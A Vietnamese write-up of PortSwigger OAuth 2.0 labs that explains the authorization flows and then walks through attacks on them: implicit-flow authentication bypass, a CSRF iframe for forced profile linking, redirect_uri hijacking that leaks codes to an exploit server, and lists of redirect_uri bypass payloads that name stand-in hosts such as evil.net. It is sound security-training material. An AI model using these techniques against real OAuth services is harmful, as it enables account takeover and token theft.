# LỖ HỔNG OAuth 2.0 authentication (PORTSWIGGER)

---

Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt gặp các trang web cho phép đăng nhập bằng tài khoản mạng xã hội của mình như: facebook, google, ... Rất có thể tính năng này được xây dựng bằng cách sử dụng framework OAuth 2.0 phổ biến. OAuth 2.0 rất dễ bị để ý với những kẻ tấn công vì nó cực kỳ phổ biến và vốn dĩ dễ mắc lỗi triển khai. Dưới đây ta sẽ tìm hiểu về lỗ hổng trong OAuth authentication.

---

## 1. OAuth là gì?

- OAuth là một khung ủy quyền thường được sử dụng cho phép các trang web và ứng dụng web yêu cầu quyền truy cập hạn chế/nhất định vào tài khoản của người dùng trên một ứng dụng khác. Điều quan trọng là OAuth cho phép người dùng cấp quyền truy cập này mà không tiết lộ thông tin đăng nhập của họ cho ứng dụng yêu cầu.

- Ví dụ, trên một website là: abc.com, thay vì tạo một tài khoản đăng nhập mới ta có thể chọn mục "Đăng nhập bằng Google", lúc này trang web sẽ phải thực hiện xin cấp quyền từ Google để có thể đăng nhập vào trang web abc.com

---

## 2. Cách thức hoạt động của OAuth 2.0

- Như đã nói, bản chất của OAuth 2.0 là cho phép ứng dụng bên thứ ba truy cập một phần dữ liệu của người dùng từ một dịch vụ khác, mà không cần chia sẻ mật khẩu của người dùng.

- Việc này xung quanh ba chủ thể:

  - Client Application (Ứng dụng khách): Ứng dụng hoặc website muốn truy cập dữ liệu người dùng.

  - Resource Owner (Chủ sở hữu tài nguyên): Chính là người dùng – người sở hữu dữ liệu. Ví dụ: người có tài khoản Google.

  - OAuth Service Provider (Nhà cung cấp dịch vụ OAuth): Nơi lưu dữ liệu và cho phép truy cập qua OAuth API. Ví dụ: Google, Facebook, GitHub... Gồm 2 thành phần chính:

      - Authorization Server – xử lý việc đăng nhập, cấp quyền, phát access token.

      - Resource Server – API chứa dữ liệu thật, chỉ trả dữ liệu khi có token hợp lệ.

- Cả hai dạng grant đều theo 4 dạng cơ bản như sau:

<img width="1189" height="1200" alt="image" src="https://github.com/user-attachments/assets/6f29f687-17fc-43a4-9345-787c8c8d2600" />

- Tập trung vào hai dạng grant phổ biển nhất là: Authorization Code Flow & Implicit Flow

  - Authorization Code Flow:
 
    Client application và dịch vụ OAuth trước tiên sử dụng chuyển hướng để trao đổi một loạt các yêu cầu HTTP dựa trên trình duyệt nhằm khởi động quy trình.

    Người dùng sẽ được hỏi có đồng ý với yêu cầu quyền truy cập hay không. Nếu họ chấp nhận, client application được cấp một "mã ủy quyền". Ứng dụng khách sau đó đổi mã      này với dịch vụ OAuth để nhận được một "access token", mà họ có thể sử dụng để thực hiện các cuộc gọi API nhằm lấy dữ liệu người dùng liên quan.

    <img width="837" height="607" alt="image" src="https://github.com/user-attachments/assets/e36521c1-79e0-417e-b87d-0d1cb165b525" />

    **Authorization request**

    Client application gửi một request đến endpoint /authorization của dịch vụ OAuth để yêu cầu quyền truy cập dữ liệu người dùng cụ thể, tùy từng loại dịch vụ OAuth, có     thể là: /auth, ...

    ```http
    GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
    Host: oauth-authorization-server.com
    ```

    ***client_id:*** Tham số bắt buộc chứa định danh duy nhất của ứng dụng khách. Giá trị này được tạo ra khi ứng dụng khách đăng ký với dịch vụ OAuth.

    ***redirected_uri:*** URI, cái mà trình duyệt của người dùng nên được chuyển hướng đến khi gửi mã ủy quyền cho ứng dụng khách. Điều này còn được gọi là "URI              callback" hoặc "endpoint callback".

    ***response_type:*** Xác định loại phản hồi mà ứng dụng khách đang mong đợi. Đối với kiểu authorization code grant, response_type là ***code***.

    **Authorization code grant**

    Nếu người dùng đồng ý với yêu cầu truy cập, trình duyệt của họ sẽ chuyển hướng tới endpoint /callback mà được chỉ định cụ thể trong ***redirected_uri***. Kết quả GET     request sẽ chứa "mã ủy quyền" như một tham số truy vấn. Phụ thuộc vào cấu hình, nó cũng có thể gửi tham số ***state*** với giá trị giống với trong authorization          request.

    ```http
    GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
    Host: client-app.com
    ```

    **Access token request**

    Một khi client application nhận "mã ủy quyền", nó cần đổi nó để yêu cầu lấy "access token", để làm điều này nó sẽ gửi một server-to-server POST request tới endpoint      /token của dịch vụ OAuth.

    ```http
    POST /token HTTP/1.1
    Host: oauth-authorization-server.com
    …
    client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
    ```

    ***client_secret:*** Client application phải xác thực chính nó bằng cách bao gồm khóa bí mật mà nó đã được cấp khi đăng ký với dịch vụ OAuth.

    ***grant_type:*** Được sử dụng để chắc chắn endpoint mới biết kiểu cấp quyền nào mà client application muốn sử dụng.

    **Access token grant**

    ```http
    {
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile",
    …
    }
    ```

    **API call**

    Tạo một API call tới endpoint /userinfo của dịch vụ OAuth, access token được gửi trong Authorization: Bearer header để chứng minh rằng client application được phép       truy cập user data.

    ```http
    GET /userinfo HTTP/1.1
    Host: oauth-resource-server.com
    Authorization: Bearer z0y9x8w7v6u5
    ```

    **Resource grant**

    Tài nguyên server sẽ xác thực giá trị của token và trả về dữ liệu người dùng dựa theo scope của access token.

    ```
    {
    "username":"carlos",
    "email":"carlos@carlos-montoya.net",
    …
    }
    ```

  - Implicit flow
 
    Thay vì đầu tiên nhận được mã ủy quyền và sau đó đổi mã đó lấy "access token", ứng dụng khách sẽ nhận được "access token" ngay lập tức sau khi người dùng cho phép.

    Câu hỏi đặt ra là vậy tại sao client application không luôn sử dụng dạng này? Đơn giản là nó kém an toàn hơn rất nhiều

    Khi sử dụng dạng này, tất cả các giao tiếp diễn ra thông qua việc chuyển hướng trình duyệt. Loại này thích hợp hơn cho single-page applications và native desktop         applications (loại app chi dành riêng cho 1 nền tảng), không thể dễ dàng lưu trữ client_secret trên máy chủ.

    <img width="837" height="499" alt="image" src="https://github.com/user-attachments/assets/d9b99f34-a8d8-4b17-84f2-6dd2971d7beb" />

    **Authorization request**

    Một điều khác so với Authorization Code Flow là response_type là ***token***.

    **Access token grant**

    Nếu người dùng đồng ý với quyền truy cập được yêu cầu. Dịch vụ OAuth sẽ chuyển hướng trình duyệt của người dùng đến redirect_uri được chỉ định trong yêu cầu ủy           quyền. Tuy nhiên, thay vì gửi một tham số truy vấn chứa mã ủy quyền, nó sẽ gửi token truy cập và các dữ liệu cụ thể về token khác dưới dạng một URL fragment.

---

## 3. OAuth Authentication

- Mặc dù ban đầu không nhằm mục đích này, OAuth cũng đã phát triển thành một công cụ để xác thực người dùng.

- Bản chất là dùng chính quy trình OAuth để xác thực người dùng (cho phép đăng nhập), chỉ thay đổi mục tiêu từ “truy cập dữ liệu” → dùng chúng để “đăng nhập”.

- Ví dụ: Giả sử bạn đăng nhập vào shopabc.com bằng Google. Lúc này:

  - Bạn không cần tạo tài khoản mới, không cần nhớ mật khẩu cho shopabc.

  - Shopabc chỉ lưu thông tin do Google cung cấp (email, tên).

  - Lần sau bạn chọn "Sign in with Google", shopabc chỉ cần xác minh token hợp lệ là bạn được vào.
 
---
 
## 4. Recon OAuth authentication:

  - Việc thực hiện một số khảo sát cơ bản về dịch vụ OAuth đang được sử dụng có thể giúp bạn định hướng đúng khi xác định các lỗ hổng.
 
  - Nếu một dịch vụ OAuth bên ngoài được sử dụng, bạn có thể xác định được nhà cung cấp cụ thể từ tên máy chủ (hostname) mà yêu cầu ủy quyền được gửi đến (trong request      /authorization).

  - Hostname này giúp ta:

    Biết đó là provider nào (Google, Facebook, GitHub, custom OAuth…)
    
    Tìm tài liệu API công khai (documentation) → biết cách hoạt động của các endpoint.
 
  - Hầu hết OAuth provider chuẩn (và cả OpenID Connect) sẽ có endpoint cấu hình public mà không cần login:
 
    ```http
    https://<provider>/.well-known/oauth-authorization-server
    https://<provider>/.well-known/openid-configuration
    ```

  - Ví dụ, một dữ liệu json được trả về:
 
    ```json
    {
      "authorization_endpoint": "https://login.example-oauth.com/authorize",
      "token_endpoint": "https://login.example-oauth.com/token",
      "userinfo_endpoint": "https://login.example-oauth.com/userinfo",
      "scopes_supported": ["openid", "email", "profile", "admin"],
      "grant_types_supported": ["authorization_code", "implicit", "password"]
    }
    ```

    &rarr; Scope admin và grant type password không được app đề cập → Có thể là điểm tấn công tiềm năng.

---

## 5. Khai thác lỗ hổng OAuth authentication

### 5.1. Các lỗ hổng trong OAuth client application

### Improper implementation of the implicit grant type

- Loại implicit grant thường được dùng cho single-page applications, tuy nhiên cũng thường được sử dụng trong các ứng dụng web truyền thống kiểu client-server vì tính đơn giản tương đối của nó.

- Trong quy trình này, "access token" được gửi từ dịch vụ OAuth tới client application qua trình duyệt của người dùng dưới dạng một phần của URL.

- Client application sau đó truy cập mã thông qua JavaScript.

- Vấn để là: nếu client application muốn duy trì phiên sau khi người dùng đóng trang, nó cần phải lưu trữ dữ liệu người dùng ở đâu đó.

- Do đó để giải quyết, client application sẽ thường gửi dữ liệu này đến server thông qua một POST request, sau đó gán cho người dùng một session cookie. Tuy nhiên, trong kịch bản này, server không có bất kỳ cái gì để so sánh với dữ liệu đã được gửi, điều này có nghĩa là dữ liệu này được tin tưởng ngầm định.

- Do đó, hành vi này có thể dẫn đến một lỗ hổng nghiêm trọng nếu client application không kiểm tra đúng cách "access token" khớp với các dữ liệu khác trong request. Trong trường hợp này, ta có thể đơn giản thay đổi các tham số gửi đến server để mạo danh bất kỳ người dùng nào.  

### Lab: Authentication bypass via OAuth implicit flow

- Giao diện trang web cho phép sử dụng mạng xã hội để đăng nhập:

  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/63448710-444b-4990-9fc6-4ff666c776df" />

- Trong lab này, ta tiến hành đăng nhập với tài khoản social media có sẵn là: *wiener:peter*. Kết quả sau khi đăng nhập thành công:

  <img width="1919" height="880" alt="image" src="https://github.com/user-attachments/assets/5674761a-5561-4835-86a5-b2081efc2ed4" />

- Sau đó trang thực hiện redirect về trang chủ.

- Thực hiện kiểm tra Burp Suite để xem quy trình OAuth trên trang web. Và khi thực hiện nhập thành công tài khoản mạng xã hội ta thấy nó bắt đầu bằng một request xác thực *GET /auth?client_id=[...]* gửi đến cho server của dịch vụ OAUth như sau:

  <img width="1431" height="516" alt="image" src="https://github.com/user-attachments/assets/157bdbc4-6c3e-4236-a179-b5c197278ad7" />

  Trong request trên, ta sẽ thấy:

  *redirect_uri=https://0a6f00d403a19fc80793a4005200e9.web-security-academy.net/oauth-callback*:	Địa chỉ callback mà Authorization Server sẽ redirect người dùng về sau khi xác thực xong.

  *response_type=token*: Đây là Implicit Flow (yêu cầu access token trực tiếp trong URL fragment thay vì code).

  *scope=openid&profile&email*:	Yêu cầu quyền truy cập thông tin OpenID, profile và email của user.

- Ta sẽ thấy OAuth Server thực hiện tạo request redirect trình duyệt về redirect_uri mà client đã đăng ký, đây chính là url mà chứa access token trả về cho về bên phía client application.

  <img width="1869" height="567" alt="image" src="https://github.com/user-attachments/assets/09a9a28a-bcae-4129-9f62-d8a61df498e6" />

  Fragment #access_token=... → là nơi token được trả về trực tiếp trên URL vì bạn đang dùng Implicit Flow (response_type=token ở request trước).

- Tiếp đó, OAuth server gửi request để tải trang /oauth-callback tới client application.

  <img width="1873" height="604" alt="image" src="https://github.com/user-attachments/assets/07182004-9bbc-4bfc-9848-86e83c14ca53" />

  Có thể thấy, sử dụng token vừa lấy để gọi API /me → mục đích: lấy thông tin profile người dùng (OpenID, email, tên, …) từ nhà cung cấp OAuth.

  Sau khi lấy được thông tin user từ OAuth provider, script sẽ gửi POST request đến endpoint /authenticate của OAuth server để lưu thông tin người dùng cho những lần đăng nhập tiếp theo như đã đề cập ở trên.

- Cuối cùng, email và username được lấy từ API /me của OAuth provider và token chính là access token mà ứng dụng đã lấy được từ OAuth server (bước trước), qua đây nó sẽ sẻ dụng POST request để gửi những dữ liệu này nên server cho những lần đăng nhập tiếp theo và sau đó gán cho người dùng một session cookie (để ý phần Set-Cookie trong phản hồi):

  <img width="1866" height="606" alt="image" src="https://github.com/user-attachments/assets/491a16a5-edc4-4cd9-ae19-8338459af3da" />

  Sau đó redirect về trang chính /.

- Tuy nhiên như đã trình bày ở trên, server tin ngay giá trị thông tin user như email trong body request này là thật, không có bất cứ gì để kiểm định lại. Do đó nếu ta dùng Burp Repeater gửi lại request POST /authenticate, sau đó sửa giá trị "email" thành ***carlos@carlos-montoya.net*** và gửi lại request, lúc này server set cookie session cho Carlos. Sau đó, thực hiện chọn "Request in browser" > "In original session" để lấy URL này:

  <img width="1432" height="1001" alt="image" src="https://github.com/user-attachments/assets/6cf0462c-ba04-4d09-a742-45e39f80f630" />

  <img width="1919" height="885" alt="image" src="https://github.com/user-attachments/assets/1ca02820-3302-421e-9a0a-f6dda72e187f" />

  &rarr; Đăng nhập thành công tài khoản *carlos*

### Flawed CSRF protection

- Nhiều thành phần trong luồng OAuth là tùy chọn, tuy nhiên một số được khuyến nghị sử dụng mạnh mẽ trừ khi có lý do quan trọng để không sử dụng chúng.

- Một ví dụ là tham số state trong endpoint /authenticate (/auth,...). Giá trị này được sử dụng để truyền qua lại giữa client application và dịch vụ OAuth như một dạng mã thông báo CSRF cho client application. Do đó nếu request xác thực không có tham số state kèm theo, thì rất có thể có tiềm năng để khai thác, nghĩa là ta có thể tự khởi động một luồng OAuth trước khi lừa trình duyệt của người dùng hoàn tất nó, tương tự như một cuộc tấn công CSRF truyền thống.

- Nếu trong một trang web mà nó cho phép người dùng đăng nhập bằng cơ chế cổ điển dựa trên mật khẩu hoặc bằng cách liên kết tài khoản social từ OAuth. Trong trường hợp này, nếu ứng dụng không sử dụng tham số state, ta có thể có khả năng chiếm đoạt tài khoản của người dùng nạn nhân bằng cách liên kết nó với tài khoản mạng xã hội của chính mình. Lưu ý là nếu trang web cho phép người dùng đăng nhập chỉ qua OAuth, thì tham số state có thể không quan trọng lắm. Tuy nhiên, không sử dụng tham số state vẫn có thể cho phép ta tạo ra các cuộc tấn công CSRF trong đăng nhập, trong đó người dùng bị lừa để đăng nhập vào tài khoản của kẻ tấn công.

### Lab: Forced OAuth profile linking

- Giao diện trang web ta thực hiện khai thác:

  <img width="1919" height="944" alt="image" src="https://github.com/user-attachments/assets/e5bb4365-3be3-4b26-a0fc-eb79a6de0d76" />

- Ta thấy giao diện login bao gốm hai mục là: nhập username password thông thường và sử dụng liên kết với social media.

- Sử dụng thông tin đăng nhập thông thường để login: ***wiener:peter***
  
  <img width="1919" height="878" alt="image" src="https://github.com/user-attachments/assets/0776a110-8373-4ada-b9e5-ba9c9ed77f62" />

- Khi đăng nhập thành công, giao diện sẽ hiện thông tin tài khoản và một phần là ***Attach a social profile***, ta thực hiện liên kết với tài khoản social profile là: wiener.peter:hotdog, giao diện khi thực hiện liên kết thành công:

  <img width="1919" height="883" alt="image" src="https://github.com/user-attachments/assets/5e439155-a334-4d8d-98fe-06b3379a6a08" />

- Thực hiện đăng xuất và đăng nhập tùy chọn "log in with social media", nhận thấy rằng trang thực hiện đăng nhập ngay lập tức qua tài khoản mạng xã hội mới liên kết của mình đó là: wiener.peter

- Để ý trong HTTP proxy của Burp, ta để ý thấy trong GET request /auth?client_id[...] của "attach a social media", thấy redirect_uri cho chức năng này gửi mã xác thực đến /oauth-linking. Quan trọng là request không bao gồm tham số state để bảo vệ chống lại các cuộc tấn công CSRF.

  <img width="1436" height="425" alt="image" src="https://github.com/user-attachments/assets/72f6bafe-9e64-4a25-80c5-7a56de74baec" />

  <img width="1874" height="597" alt="image" src="https://github.com/user-attachments/assets/c817e99a-3e7c-49f0-9f39-c7f24402b771" />

- Trong Burp, thực hiện bật proxy interception, sau đó trên trang web thực hiện chọn lại "Attach a social media", quay lại proxy interception của Burp, thực hiện forward tất cả các request cho đến khi tới request: ***GET /oauth-linking?code=[...]***:

  <img width="1919" height="1009" alt="image" src="https://github.com/user-attachments/assets/42a74dd7-20c3-45a5-bc28-b1f0716450da" />

  Thực hiện chuột phải và chọn Copy URL, sau đó drop request, điều này đồng nghĩa với việc ***code*** không được sử dụng nhưng nó vẫn còn giá trị.

  Tắt proxy interception và thực hiện log out tài khoản.

- Trong exploit server, tạo một thẻ iframe trong đó thuộc tính src trỏ tới URL oauth-linking ... mà ta vừa copy:

  <img width="1919" height="942" alt="image" src="https://github.com/user-attachments/assets/c687cc0c-07bf-4253-b8fc-abe6fa35489d" />

- Thực hiện deliver exploit tới cho victim, khi trình duyệt của họ load iframe, nó sẽ hoàn thành luồng OAuth sử dụng tài khoản social media của mình và liên kết nó tới tài khoản admin của blog website:
  
  <img width="1919" height="929" alt="image" src="https://github.com/user-attachments/assets/e3923c50-5af4-4227-bc92-d82d3a14d041" />

  <img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/5007e5d3-47c2-430c-b6bb-354f63662512" />

  <img width="1919" height="877" alt="image" src="https://github.com/user-attachments/assets/b1489c8c-5f96-420c-b870-165cc15ecd06" />

  &rarr; Thành công xóa một user.

---

### 5.2. Leaking authorization codes and access tokens

- Tùy thuộc vào loại ủy quyền, một authorization coded hoặc access token sẽ được gửi qua trình duyệt của nạn nhân tới endpoint /callback được chỉ định trong tham số redirect_uri của yêu cầu ủy quyền.

- Nếu dịch vụ OAuth không xác thực đúng cách URI này, ta có thể xây dựng một cuộc tấn công giống như CSRF, lừa trình duyệt của nạn nhân khởi tạo một quy trình OAuth sẽ gửi authorization coded hoặc access token đến redirect_uri do kẻ tấn công kiểm soát.

- Trong trường hợp authorization code flow, ta có thể lấy cắp mã của nạn nhân trước khi nó được sử dụng. Sau đó, có thể gửi mã này đến endpoint /callback hợp lệ của client application (redirect_uri gốc) để truy cập vào tài khoản của người dùng.
  
- Trong kịch bản này, ta thậm chí không cần biết client_secret hoặc access token. Miễn là nạn nhân có một phiên hợp lệ với dịch vụ OAuth, client application sẽ chỉ đơn giản hoàn tất việc trao đổi mã/tokens thay mặt ta trước khi đăng nhập vào tài khoản của nạn nhân.
  
- Lưu ý rằng việc sử dụng ***state*** hoặc ***nonce*** không nhất thiết ngăn chặn các cuộc tấn công này vì ta có thể tạo ra các giá trị mới từ trình duyệt của riêng mình.

- Note: ***Authorization servers an toàn hơn sẽ yêu cầu một tham số redirect_uri được gửi khi trao đổi mã. Server sau đó có thể kiểm tra xem tham số này có khớp với cái mà nó nhận được trong yêu cầu ủy quyền ban đầu hay không và sẽ từ chối trao đổi nếu không khớp. Vì điều này xảy ra trong các yêu cầu server to server thông qua một back-channel an toàn, nên ta sẽ không thể kiểm soát tham số redirect_uri thứ hai này.***

### Lab: OAuth account hijacking via redirect_uri

- Giao diện trang web ta thực hiện khai thác:

  <img width="1919" height="942" alt="image" src="https://github.com/user-attachments/assets/950f54e0-f32a-441a-b751-4c8aefcae886" />

- Giao diện cho phép user đăng nhập bằng liên kết social media:

  <img width="1919" height="933" alt="image" src="https://github.com/user-attachments/assets/524d81cf-fdf4-4603-9f5c-ec199ab94412" />

- Sử dụng một tài khoản social media sẵn: ***wiener:peter*** để đăng nhập. Giao diện khi đăng nhập thành công:

  <img width="1919" height="882" alt="image" src="https://github.com/user-attachments/assets/6e6e6884-2d0d-414a-98cd-a37bfd44cd38" />

- Kể từ đây, sau mỗi lần đằng xuất và đăng nhập lại, ta thấy tài khoản trên được đăng nhập lại tức thì, do đó có thể nhận thấy có một phiên đang hoạt động với dịch vụ OAuth, nên ta không cần phải nhập lại thông tin xác thực của mình để xác thực.

- Trong Burp, bật chế độ Proxy Interception, ta nhận thấy một yêu cầu xác thực GET request, bắt đầu với ***GET /auth?client_id=[...]*** trong đó chứa ***redirect_uri*** là endpoint /oauth-callback:

  <img width="1919" height="922" alt="image" src="https://github.com/user-attachments/assets/1262af37-1366-4bed-9e6c-5a39541ab13f" />

- Ngay sau khi thực hiện forward GET request này, ngay lập tức ta sẽ được chuyển hướng đến redirect_uri cùng với authorization code trong chuỗi truy vấn:

  <img width="1868" height="637" alt="image" src="https://github.com/user-attachments/assets/8e4fffcd-4eba-4c3f-be4d-542a6bda90fb" />

- Thực hiện gửi GET request ủy quyền vào trong chế độ Burp Repeater, và thực hiện sửa đổi tham số ***redirect_uri*** tùy ý, thực hiện gửi request và thấy được rằng server không báo lỗi, thay vào đó đầu vào ta nhập được sử dụng để tạo redirect trong phản hồi.

  <img width="1868" height="856" alt="image" src="https://github.com/user-attachments/assets/4458edbe-ea7b-4494-a07f-48adadcf8d58" />

- Thực hiện thay đổi tham số ***redirect_uri*** thành domain lấy từ Burp Collaborator, sau đó thực hiện gửi request và follow redirection:

  <img width="1864" height="798" alt="image" src="https://github.com/user-attachments/assets/ef8ca28f-d6b2-4a92-b6df-a942883e416d" />

- Ta nhận thấy một request có chứa authorization code gửi đến server Collab:

  <img width="1918" height="918" alt="image" src="https://github.com/user-attachments/assets/58c767b8-7760-44b3-9a72-523bcdbffcac" />

  &rarr; Điều này xác nhận rằng ta có thể rò rỉ authorization code ra external domain.

- Trên exploit server của ta, thực hiện tạo một request trong đó phần body tạo một thê ***iframe*** với thuộc tính src ta tạo với nội dung link: ***https://oauth-0ae500b0044262ed83b75dbf02ff00ca.oauth-server.net/auth?client_id=aiub01nvs4sng53f9kvva&redirect_uri=https://exploit-0a13003a04b46295832c5e80015a0041.exploit-server.net&response_type=code&scope=openid%20profile%20email***, với ***redirect_uri*** ta để là domain của *exploit server*, sau đó thực hiên gửi đến cho victim ở đây là admin user và chờ payload được kích hoạt do admin click mở vào đường link giấu trong thẻ <iframe>.

  <img width="1917" height="937" alt="image" src="https://github.com/user-attachments/assets/72afe568-846b-4c92-82a5-3c5bf7507e42" />

- Kiểm tra, access log của exploit server của ta, nhận thấy có một request trả về authorization code bị rò rỉ &rarr; admin đã login sẵn vào OAuth provider và session đó còn hiệu lực và khi admin ấn vào payload, OAuth server sẽ không hỏi lại username/password. Thay vào đó, OAuth flow chạy thẳng → cấp code/token ngay:

  <img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/0157070c-1494-4069-8901-7e6004a0d5bb" />

- Thực hiện đăng xuất tải khoản cũ, sau đó thực hiện truy cập đến:

  ```url
  https://0a4e001904de624083755f190006004b.web-security-academy.net/oauth-callback?code=cZCc1G_sDibt0-v3qIYUMyZI3f8ogEqgVNKp6frrk0I
  ````

  Trong đó tham số ***code*** là lấy từ authorization code gửi về cho exploit server lấy từ mục access log.

  Lúc này phần còn lại của flow OAuth sẽ được hoàn thành tự động và ta sẽ được đăng nhập với tư cách người dùng quản trị.

  <img width="1917" height="939" alt="image" src="https://github.com/user-attachments/assets/76040d04-c2cc-4f55-acd6-9d29e3524aa3" />

  Thực hiện xóa thành công user carlos trong tài khoản admin:

  <img width="1919" height="932" alt="image" src="https://github.com/user-attachments/assets/1662ae91-b665-403e-b28c-cf311fed3094" />
  
### Flawed redirect_uri validation

- Các client application có thể sử dụng một whitelist chính xác các callback URIs mà đã đăng ký với với dịch vụ OAuth. Bằng cách này, khi dịch vụ OAuth nhận được một yêu cầu mới, nó có thể xác thực tham số redirect_uri so với whitelist này.

- Tuy nhiên, vẫn có một số cách để thực hiện bypass:

  - Chỉ kiểm tra “bắt đầu bằng” (prefix match): Một số server chỉ check chuỗi bắt đầu đúng domain hợp lệ (startsWith) &rarr; thêm ***path/query/fragment*** tùy ý để xem ta có thể thay đổi điều gì mà không bị kích hoạt lỗi.
 
    Thêm/đổi path:

    ```url
    redirect_uri=https://victim.com/callback/extra
    redirect_uri=https://victim.com/callback../alt
    ```

    Thêm query/fragment:
    
    ```url
    redirect_uri=https://victim.com/callback?next=https://evil.net
    redirect_uri=https://victim.com/callback#https://evil.net
    ```

  - Lợi dụng cách parser khác nhau (URL confusion). Một URL chuẩn có cấu trúc như sau:
 
    ```
    scheme://[userinfo@]host[:port]/path?query#fragment
    ```

    userinfo@ = phần “username:password” trước dấu @

    host = domain thật sự.

    Nhiều OAuth server/validator lại check redirect_uri bằng string-compare, hoặc parser custom ⇒ dẫn đến cách hiểu khác nhau.

    Ví dụ với payload:

    ```url
    https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
    ```

    Khi validator không parse URL chuẩn mà chỉ làm kiểu string-check (ví dụ: startsWith("https://victim.com") hoặc contains("victim.com")) → server tưởng là domain hợp       lệ (victim), và cho phép redirect uri này.

    Nếu OAuth server check redirect_uri bằng string-compare hoặc regex đơn giản, nó thấy "victim.com&" và nghĩ chỉ là query param, chứ không nhận ra đây là userinfo.

    Bypass filter: & khiến URL trông giống query string (victim.com&param=...) chứ không giống username, nên dễ bị bỏ qua.

    Nhưng phía browser/client application hiểu phần trước dấu @ là userinfo và host là phần sau dấu @ cho đến #, nên host thực sự mà browser connect = foo.evil-user.net.     Browser hoàn toàn bỏ qua dấu &, nó chỉ coi là một ký tự bình thường trong userinfo.

    #@bar.evil.net/ chỉ là fragment (client-side thôi, server không thấy), được dùng để có thể lợi dụng thêm trong front-end (nếu app JS xử lý hash).

  - Server-Side Parameter Pollution (SSPP). Gửi trùng tham số redirect_uri:
 
    ```url
    https://auth.victim.com/authorize?client_id=123&redirect_uri=https://client.com/cb&redirect_uri=https://evil.net
    ```

    Tùy stack back-end: lấy tham số đầu, cuối, hay join. Nếu validator check cái đầu nhưng handler dùng cái cuối ⇒ bypass.

  - “Đặc quyền” cho localhost. Nhiều hệ thống allow http://localhost trong môi trường dev và quên tighten ở prod:

    Bypass: đăng ký/redirect domain na ná:
    
    ```
    http://localhost.evil-user.net/cb
    http://127.0.0.1.evil-user.net/cb
    http://[::1].evil-user.net/cb
    ```

    Validator ngu ngơ chỉ startsWith("http://localhost") → toang.

- Cũng cần lưu ý rằng bạn không nên giới hạn việc kiểm tra của mình chỉ vào việc kiểm tra tham số redirect_uri một cách tách biệt. Đôi khi, việc thay đổi một tham số có thể ảnh hưởng đến việc xác thực các tham số khác. Ta có thể thử đổi response_mode để xem validation thay đổi không, vì có lúc đổi mode sẽ phá vỡ logic check redirect_uri → mở đường bypass.

- Ví dụ, việc thay đổi response_mode từ query sang fragment đôi khi có thể hoàn toàn thay đổi cách phân tích redirect_uri:

  ```url
  https://auth.server.com/authorize?client_id=123&response_type=code&response_mode=fragment&redirect_uri=https://app.victim.com/callback#@evil.net
  ```

  Validator chỉ so sánh phần trước dấu #. Thấy https://app.victim.com/callback → hợp lệ.

  Nhưng khi AS redirect, client application nhận:

  ```
  https://app.victim.com/callback#@evil.net&code=ABC123
  ```

  Nếu front-end JS xử lý location.hash không chuẩn (ví dụ parse @evil.net như một URL → redirect tiếp), ta có thể lấy được ***code=ABC123***.

- Hoặc nếu server hỗ trợ ***web_message***, thay vì strict check redirect_uri đúng domain, nhiều implementation chỉ check origin domain (ví dụ *.victim.com). Nên ta có thể tận dụng để đăng ký với domain:

  ```
  redirect_uri=https://evil.victim.com/callback
  ```

  &rarr; bypass.

### Stealing codes and access tokens via a proxy page

- Một cách khác khi đường cùng lực kiệt là thử cố gắng thay đổi tham số redirect_uri trỏ tới một domain khác nằm trong whitelist domain của OAuth.

- Cố gắng tìm cách để có thể truy cập thành công vào các miền con hoặc đường dẫn khác nhau. Ví dụ, URI mặc định thường sẽ nằm trên một đường dẫn cụ thể OAuth, chẳng hạn như /oauth/callback. Lúc này, ta có thể sử dụng các thủ thuật duyệt thư mục để cung cấp bất kỳ đường dẫn tùy ý nào trên miền như, giống path traversal:

  ```url
  https://client-app.com/oauth/callback/../../example/path
  ```

  Phía back-end có thể được hiểu thành:

  ```
  https://client-app.com/example/path
  ```

  Sau khi đã xác định được trang khác ta có thể thiết lập làm URI chuyển hướng, ta cần kiểm tra chúng để tìm đường rò rỉ query/fragment (nơi code/token nằm).

  Đối với authorization code flow, ta cần tìm một lỗ hổng cho phép đọc query param, trong khi đối với loại implicit grant type, ta cần trích xuất URL fragment. Một trong   những lỗ hổng hữu ích nhất cho mục đích này là open redirect, sử dụng nó như một "proxy".

  Giả sử, ta bypass được whitelist để redirect tới một endpoint hợp lệ của app:

  ```url
  https://victim.com/redirect?next=https://evil.net
  ```

  tức là ***redirect_uri=https://victim.com/redirect*** là một endpoint hợp lệ trong whitelist mà ta tìm được, tuy nhiên nó tồn tài lỗ hổng *open redirect* → Khi user bị   redirect về đây, victim.com sẽ 302 tiếp sang https://evil.net.

  Do đó, mà OAuth flow sẽ trả về như sau và ta vẫn thu được code/token:

  ```url
  https://victim.com/redirect?next=https://evil.net?code=ABC123
  ```

- Với implicit grant type, toàn quá trình được diễn ra qua browser và token xuất hiện ngay trên URL fragment trong browser. Nếu attacker lấy được access token này → có thể gọi trực tiếp API của OAuth Resource Server. Nghĩa là không chỉ login vào app nạn nhân, mà còn có thể query dữ liệu user (email, danh bạ, file, …) ngoài phạm vi app web.

### Lab: Stealing OAuth access tokens via an open redirect

- Giao diện trang web ta thực hiện khai thác:

  <img width="1912" height="944" alt="image" src="https://github.com/user-attachments/assets/a09f7850-b066-4c60-85ca-6480f067ec40" />

- Tương tư, các bài lab trên, web cho phép đăng nhập liên kết với social media, ta thực hiện đăng nhập với một tài khoản social của mình là: *wiener:peter*:

  <img width="1918" height="939" alt="image" src="https://github.com/user-attachments/assets/feaa3099-b04e-4b81-99ea-24a43875e131" />

- Trong Proxy Interception của Burp, ta nhận thấy web thực hiện một cuộc gọi API tới userinfo endpoint là /me, sau đó sử dụng dữ liệu mà nó lấy để đăng nhập.
  
  <img width="1574" height="512" alt="image" src="https://github.com/user-attachments/assets/fb7f47f3-5fc2-4d7a-b421-32c0c2f3f9ea" />

  Cùng với đó là requets: */auth?client_id...*

